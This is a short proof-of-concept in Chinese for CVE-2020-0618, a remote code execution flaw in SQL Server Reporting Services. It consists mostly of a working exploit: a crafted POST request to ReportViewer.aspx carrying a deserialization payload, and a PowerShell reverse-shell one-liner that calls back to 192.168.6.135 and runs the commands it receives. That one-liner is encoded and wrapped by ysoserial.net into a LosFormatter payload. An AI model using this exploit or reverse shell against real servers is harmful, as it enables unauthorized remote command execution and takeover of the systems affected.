# CVE-2020-0618
SQL Server Reporting Services(CVE-2020-0618)中的RCE
#
# 漏洞验证(POC)
可以将以下HTTP请求发送到服务器以利用该应用程序:
```
POST /ReportServer/pages/ReportViewer.aspx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: X

NavigationCorrector$PageState=NeedsCorrection&NavigationCorrector$ViewState=[PayloadHere]&__VIEWSTATE=
```
可以在PowerShell中使用以下命令来使用ysoserial.net工具生成有效负载:
ysoserial.net工具:https://github.com/pwntester/ysoserial.net
```
$command = '$client = New-Object System.Net.Sockets.TCPClient("192.168.6.135",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  =$sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)

$encodedCommand = [Convert]::ToBase64String($bytes)

.\ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "powershell.exe -encodedCommand $encodedCommand" -o base64 | clip
```
